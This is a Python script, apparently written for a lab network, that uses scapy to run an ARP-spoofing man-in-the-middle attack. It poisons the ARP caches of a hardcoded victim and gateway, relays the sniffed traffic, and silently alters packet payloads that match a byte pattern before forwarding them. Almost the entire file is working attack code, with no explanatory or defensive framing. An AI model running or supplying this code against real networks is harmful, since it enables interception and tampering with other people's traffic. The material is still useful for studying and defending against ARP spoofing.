#!/usr/bin/env python3
import coloredlogs, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import sys
import os
import time
import multiprocessing
import binascii

#################
# Getting input #
#################
try:
    interface = "enp0s31f6"
    victimIP = "192.168.0.30"
    gateIP = "192.168.0.52"
    ownMAC = "8c:16:45:31:71:01"

except KeyboardInterrupt:
    logging.info("\n[*] User Requested Shutdown")
    logging.info("[*] Exiting...")
    sys.exit(1)

os.system("/bin/echo 0 > /proc/sys/net/ipv4/ip_forward") # nosec


########################
# Getting Mac Adresses #
########################
def get_mac(IP):
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), iface = interface)
    for snd, rcv in ans:
        return rcv[Ether].src
        

#########################
# Re-ARPing the Targets #
#########################
def reARP():
    logging.info("\n[*] Restoring Targets...")
    victimMAC = get_mac(victimIP)
    gateMAC = get_mac(gateIP)
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
    logging.info("[*] Shutting Down...")
    sys.exit(1)

########################
# Tricking the Targets #
########################
def trick():
    while True:
        send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = victimMAC))
        send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = gateMAC))
        time.sleep(5)

######################################
# Do action for every sniffed packet #
######################################
def set_packet(packet):
    if(packet.haslayer(IP)):
        if (packet[Ether].src == victimMAC) and (packet[Ether].dst == ownMAC):
            packet[Ether].src = ownMAC
            packet[Ether].dst = gateMAC
            #logging.info("Got from victim -> gate")
            packet = manipulate_packet(packet)
            if(packet.haslayer(IP)):
                del packet[IP].chksum
            if(packet.haslayer(TCP)):
                del packet[TCP].chksum
            sendp(packet, iface = interface, verbose=False)
            #logging.info("Send from script to gate")

        elif (packet[Ether].src == gateMAC) and (packet[Ether].dst == ownMAC):        
            packet[Ether].src = ownMAC
            packet[Ether].dst = victimMAC
            #logging.info("Got from gate -> victim")
            #logging.info(str(packet[Ether].src))
            #logging.info(str(packet[Ether].dst))
            packet = manipulate_packet(packet)
            if(packet.haslayer(IP)):
                del packet[IP].chksum
            if(packet.haslayer(TCP)):
                del packet[TCP].chksum
            sendp(packet, iface = interface, verbose=False)
            #logging.info("Send from script to victim")

####################################
# Manipulate Packet                #
####################################
def manipulate_packet(packet):
    if(packet.haslayer(Raw)):
        #logging.info("Manipulating packet")
        logging.info(packet[Raw].load)
        payload = binascii.hexlify((packet[Raw].load))
        payload = payload.decode('utf-8')
        logging.info("Payload: " + str(payload))
        #logging.info("Searching: " + str('000401020101'))
        if (str('000401020101') in str(payload)):    
            #new_payload = binascii.hexlify(b"Payload changed.")
            new_payload = payload[:-2] + '03'
            #logging.info("Payload without encoding")
            logging.info("New Payload: " + str(new_payload))
            packet[Raw].load = binascii.unhexlify(new_payload)
            del(packet[IP].len)
    return packet

########
# Main #
########

def mitm_main():
    global victimMAC
    global gateMAC

    coloredlogs.install()
    logging.info("Starting logger")


    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        logging.error("[!] Couldn't Find Victim MAC Address")
        logging.error("[!] Exiting...")
        sys.exit(1)
    try:
        gateMAC = get_mac(gateIP)
    except Exception:
        logging.error("[!] Couldn't Find Gateway MAC Address")
        logging.error("[!] Exiting...")
        sys.exit(1)
    logging.info("[*] Poisoning Targets...")
    try:
        t = multiprocessing.Process(target = trick, )        
        t.start()
        sniff(iface = interface, prn = set_packet) 
    except KeyboardInterrupt:
        reARP()

mitm_main()





















